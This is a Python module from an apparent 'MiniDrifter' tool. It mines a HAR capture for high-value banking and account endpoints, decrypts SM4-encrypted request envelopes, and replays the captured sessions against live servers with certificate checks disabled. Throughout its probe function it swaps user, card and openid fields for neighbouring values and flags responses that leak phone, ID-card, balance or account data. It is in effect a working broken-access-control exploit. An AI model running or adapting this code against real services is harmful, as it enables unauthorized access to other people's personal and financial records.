# -*- coding: utf-8 -*-
"""Limited live RR-Drift probe over HAR business APIs (generic MiniDrifter capability).

Selects a small set of high-value HAR endpoints (account / card / invoice / …),
optionally decrypts cipher envelopes after key alignment, drifts identity-like
fields, and reports Accept / SEffect style evidence without mutating Gold.
"""
from __future__ import annotations

import json
import re
import ssl
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qsl, unquote, urlparse

from minidrifter.core.utils import write_json
from minidrifter.optimizers.url_utils import is_chain_business_path, is_json_rpc_path
from minidrifter.runtime.crypto.har_key_align import (
    align_pack_crypto_with_har,
    decrypt_quality,
)
from minidrifter.runtime.crypto.registry import get_crypto_engine_for_pack
from minidrifter.runtime.crypto.sm4_dual_form_wrapper import Sm4DualFormEngine
from minidrifter.runtime.crypto_replay import sm4_engine_from_material

HIGH_VALUE_RE = re.compile(
    r'(account|card|bind|invoice|einvoice|order|cert|auth|userinfo|member|'
    r'wallet|balance|personal|idcard|queryaccount|cardbinding|einvoice|'
    r'minipro|lifepayment)',
    re.I,
)
DRIFT_FIELD_RE = re.compile(
    r'(userid|uid|openid|unionid|memberid|accountid|accountno|acct|cust|'
    r'customer|phone|mobile|cardno|certno|idcard|token|session|orderid|bill)',
    re.I,
)
SKIP_FIELD = frozenset({
    'requesttype', '_locale', 'locale', 'cipherh5', 'cipherone', 'ciphertwo',
    'sign', 'timestamp', 'nonce', 'appid',
})

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE
# 部分银行网关仍要求 legacy renegotiation
try:
    _ssl_ctx.options |= getattr(ssl, 'OP_LEGACY_SERVER_CONNECT', 0x4)
except Exception:
    pass
try:
    _ssl_ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
except Exception:
    pass


def _utc() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat().replace('+00:00', 'Z')


def _http(url: str, data: Optional[Any], headers: Dict[str, str], method: str = 'POST',
          timeout: int = 15) -> Tuple[int, str, float]:
    body = None
    h = dict(headers or {})
    if data is not None:
        if isinstance(data, dict):
            body = urllib.parse.urlencode({str(k): str(v) for k, v in data.items()}).encode('utf-8')
            h.setdefault('Content-Type', 'application/x-www-form-urlencoded')
        elif isinstance(data, (bytes, bytearray)):
            body = bytes(data)
        else:
            body = str(data).encode('utf-8')
    req = urllib.request.Request(url, data=body, headers=h, method=(method or 'POST').upper())
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx, timeout=timeout) as resp:
            raw = resp.read()
            status = int(resp.status)
    except urllib.error.HTTPError as e:
        raw = e.read() if e.fp else b''
        status = int(e.code)
    except Exception as e:
        # fallback: reuse ChainExecutor SSL helper if present
        try:
            from minidrifter.runtime_trace.chain_executor import _http as ce_http
            # ce_http expects dict body for form
            if isinstance(data, str):
                form = dict(parse_qsl(data, keep_blank_values=True))
                return ce_http(url, form if method.upper() != 'GET' else None, headers, method, timeout)
            return ce_http(url, data if method.upper() != 'GET' else None, headers, method, timeout)
        except Exception:
            return 0, f'{type(e).__name__}: {e}', (time.time() - t0) * 1000
    try:
        text = raw.decode('utf-8')
    except Exception:
        text = raw.decode('gbk', errors='replace')
    return status, text, (time.time() - t0) * 1000


def _entry_params(entry: Dict[str, Any]) -> Dict[str, str]:
    req = entry.get('request') or {}
    post = req.get('postData') or {}
    text = post.get('text') or ''
    params: Dict[str, str] = {}
    if text:
        if text.lstrip().startswith('{'):
            try:
                obj = json.loads(text)
                if isinstance(obj, dict):
                    params.update({str(k): str(v) for k, v in obj.items() if v is not None})
            except Exception:
                pass
        if not params:
            params.update({k: v for k, v in parse_qsl(text, keep_blank_values=True)})
    for item in post.get('params') or []:
        if isinstance(item, dict) and item.get('name'):
            params[str(item['name'])] = str(item.get('value') or '')
    for k in list(params):
        if 'cipher' in k.lower():
            params[k] = unquote(params[k])
    return params


def _entry_headers(entry: Dict[str, Any]) -> Dict[str, str]:
    req = entry.get('request') or {}
    out = {}
    for h in req.get('headers') or []:
        name = str(h.get('name') or '')
        if not name or name.startswith(':'):
            continue
        low = name.lower()
        if low in ('content-length', 'host', 'connection', 'accept-encoding'):
            continue
        out[name] = str(h.get('value') or '')
    return out


def _score_path(path: str) -> float:
    score = 0.0
    if is_json_rpc_path(path):
        score += 4
    if is_chain_business_path(path):
        score += 2
    if HIGH_VALUE_RE.search(path):
        score += 5
    if re.search(r'(account|cardbinding|einvoice|certauth|orderrecords)', path, re.I):
        score += 3
    if re.search(r'(advert|pushconfig|abtest|campaign|collect\.do)', path, re.I):
        score -= 4
    return score


def select_limited_har_targets(
    har_path: Path,
    *,
    max_targets: int = 8,
) -> List[Dict[str, Any]]:
    doc = json.loads(Path(har_path).read_text(encoding='utf-8', errors='replace'))
    entries = (doc.get('log') or {}).get('entries') or []
    seen: Set[str] = set()
    scored: List[Tuple[float, Dict[str, Any]]] = []
    for i, entry in enumerate(entries):
        req = entry.get('request') or {}
        url = req.get('url') or ''
        parsed = urlparse(url)
        path = parsed.path or '/'
        host = parsed.netloc
        if 'datafinder' in host or host.startswith('static.'):
            continue
        if '/h5/' in path:
            continue
        status = int((entry.get('response') or {}).get('status') or 0)
        if status and status not in range(200, 300):
            continue
        if not (is_json_rpc_path(path) or is_chain_business_path(path) or HIGH_VALUE_RE.search(path)):
            continue
        key = f"{(req.get('method') or 'POST').upper()}::{path}"
        if key in seen:
            continue
        seen.add(key)
        score = _score_path(path)
        if score < 3:
            continue
        scored.append((score, {
            'har_index': i,
            'method': (req.get('method') or 'POST').upper(),
            'url': url,  # keep query string (session/locale)
            'path': path,
            'host': host,
            'score': score,
            'entry': entry,
        }))
    scored.sort(key=lambda x: -x[0])
    return [t for _, t in scored[:max_targets]]


def _try_decrypt_fields(engine: Any, params: Dict[str, str]) -> Dict[str, str]:
    fields: Dict[str, str] = {}
    cipher_h5 = params.get('cipherH5') or params.get('cipherh5')
    if cipher_h5 and hasattr(engine, 'decrypt_cipher_blob_to_fields'):
        try:
            fields.update(engine.decrypt_cipher_blob_to_fields(cipher_h5))
            if decrypt_quality(json.dumps(fields, ensure_ascii=False)) < 0.5 and decrypt_quality(
                '&'.join(f'{k}={v}' for k, v in fields.items())
            ) < 0.5:
                # garbage → discard
                if not any(DRIFT_FIELD_RE.search(k) for k in fields):
                    fields = {}
        except Exception:
            fields = {}
    cipher_one = params.get('cipherOne') or params.get('cipherone')
    cipher_two = params.get('cipherTwo') or params.get('ciphertwo')
    if (cipher_one or cipher_two) and hasattr(engine, 'material'):
        sm4 = sm4_engine_from_material(engine.material) if engine else None
        if sm4 is None:
            try:
                sm4 = Sm4DualFormEngine(engine.material)
            except Exception:
                sm4 = None
        if sm4:
            try:
                fields.update(sm4.decrypt_dual_form(cipher_one, cipher_two))
            except Exception:
                pass
    # also keep plaintext identity-like params
    for k, v in params.items():
        if k.lower() in SKIP_FIELD or 'cipher' in k.lower():
            continue
        if DRIFT_FIELD_RE.search(k) and v:
            fields.setdefault(k, v)
    return fields


def _pick_drift_field(fields: Dict[str, str]) -> Optional[Tuple[str, str]]:
    ranked = []
    for k, v in fields.items():
        if k.lower() in SKIP_FIELD or not v:
            continue
        if not DRIFT_FIELD_RE.search(k):
            continue
        rank = 0
        kl = k.lower()
        if kl in ('userid', 'memberid', 'openid', 'accountid', 'cardno'):
            rank = 0
        elif 'id' in kl:
            rank = 1
        else:
            rank = 2
        ranked.append((rank, k, v))
    if not ranked:
        return None
    ranked.sort()
    return ranked[0][1], ranked[0][2]


def _synthetic_donor(primary: str) -> str:
    if primary.isdigit() and len(primary) >= 6:
        n = int(primary)
        return str(max(1, n + 7))
    if len(primary) >= 8:
        return primary[:-2] + 'xx'
    return primary + '_x'


def _response_sensitive(body: str) -> bool:
    if not body:
        return False
    return bool(re.search(
        r'(phone|mobile|idcard|cert|realname|account|cardno|openid|userid|balance|order)',
        body,
        re.I,
    )) and ('null' not in body[:40].lower() or len(body) > 80)


def run_limited_har_crbd_probe(
    pack_dir: Path,
    har_path: Path,
    *,
    max_targets: int = 8,
    i_know: bool = False,
    align_crypto: bool = True,
    base_url: str = '',
) -> Dict[str, Any]:
    pack_dir = Path(pack_dir)
    har_path = Path(har_path)
    out: Dict[str, Any] = {
        'schema_version': 'har_crbd_probe_v1',
        'generated_at': _utc(),
        'pack_dir': str(pack_dir),
        'har': str(har_path),
        'mode': 'execute' if i_know else 'dry-run',
        'align': None,
        'targets': [],
        'summary': {},
    }
    if align_crypto and har_path.exists():
        out['align'] = align_pack_crypto_with_har(pack_dir, har_path, persist=True)

    engine, cap = get_crypto_engine_for_pack(pack_dir)
    targets = select_limited_har_targets(har_path, max_targets=max_targets)
    results = []
    n_accept = n_seffect = n_decrypt = 0

    for t in targets:
        entry = t['entry']
        params = _entry_params(entry)
        headers = _entry_headers(entry)
        url = t['url']
        method = t['method']
        row: Dict[str, Any] = {
            'path': t['path'],
            'method': method,
            'score': t['score'],
            'url': url,
            'decrypt_ok': False,
            'drift_field': None,
            'baseline': None,
            'drift': None,
            'Accept': False,
            'SEffect': False,
            'note': '',
        }
        fields = _try_decrypt_fields(engine, params) if engine else {}
        # merge plaintext if decrypt empty
        if not fields:
            fields = {k: v for k, v in params.items() if k.lower() not in SKIP_FIELD and 'cipher' not in k.lower()}
        if fields and (out.get('align') or {}).get('ok') or any(DRIFT_FIELD_RE.search(k) for k in fields):
            if fields and decrypt_quality('&'.join(f'{k}={v}' for k, v in list(fields.items())[:8])) >= 0.5:
                row['decrypt_ok'] = True
                n_decrypt += 1
        pick = _pick_drift_field(fields)
        if pick:
            row['drift_field'] = pick[0]
            row['primary'] = pick[1]
            row['donor'] = _synthetic_donor(pick[1])

        if not i_know:
            row['note'] = 'dry-run; pass --i-know for live HTTP'
            results.append(row)
            continue

        # baseline: prefer raw HAR body replay (session cookies/tokens intact)
        raw_body = ((entry.get('request') or {}).get('postData') or {}).get('text')
        st0, bd0, el0 = _http(url, raw_body if method != 'GET' else None, headers, method)
        row['baseline'] = {
            'status': st0,
            'elapsed_ms': el0,
            'preview': bd0[:220],
            'ok': st0 == 200,
        }
        accept = st0 == 200
        row['Accept'] = accept
        if accept:
            n_accept += 1

        # drift attempt when we can rebuild
        if accept and pick and engine and hasattr(engine, 'build_post_request') and row['decrypt_ok']:
            field, primary = pick
            donor = row['donor']
            mutated = dict(fields)
            mutated[field] = donor
            try:
                host = t['host']
                bu = base_url or f'https://{host}'
                built = engine.build_post_request(bu, t['path'], mutated)
                # preserve session headers from HAR
                hdrs = dict(headers)
                hdrs.update(built.get('headers') or {})
                st1, bd1, el1 = _http(built['url'], built.get('data'), hdrs, built.get('method') or 'POST')
                seffect = st1 == 200 and (
                    _response_sensitive(bd1)
                    or (bd1 != bd0 and len(bd1) > 40)
                )
                row['drift'] = {
                    'status': st1,
                    'elapsed_ms': el1,
                    'preview': bd1[:220],
                    'donor': donor,
                    'field': field,
                    'seffect': seffect,
                }
                row['SEffect'] = bool(seffect)
                if seffect:
                    n_seffect += 1
            except Exception as ex:
                row['note'] = f'drift_rebuild_failed:{type(ex).__name__}:{ex}'
        elif accept and not pick:
            # raw replay only — still useful as reachability
            row['note'] = 'no_plaintext_drift_field; baseline Accept only'
            if _response_sensitive(bd0):
                row['SEffect'] = True
                n_seffect += 1
                row['note'] = 'baseline_response_has_sensitive_keys'
        results.append(row)

    out['targets'] = [{k: v for k, v in r.items() if k != 'entry'} for r in results]
    out['summary'] = {
        'n_targets': len(results),
        'n_accept': n_accept,
        'n_seffect': n_seffect,
        'n_decrypt_ok': n_decrypt,
        'crypto_profile': getattr(cap, 'profile_id', None) if cap else None,
        'can_replay': bool(cap and cap.can_replay),
    }
    out_path = pack_dir / 'har_crbd_probe_report.json'
    write_json(out_path, out)
    out['output'] = str(out_path)
    return out
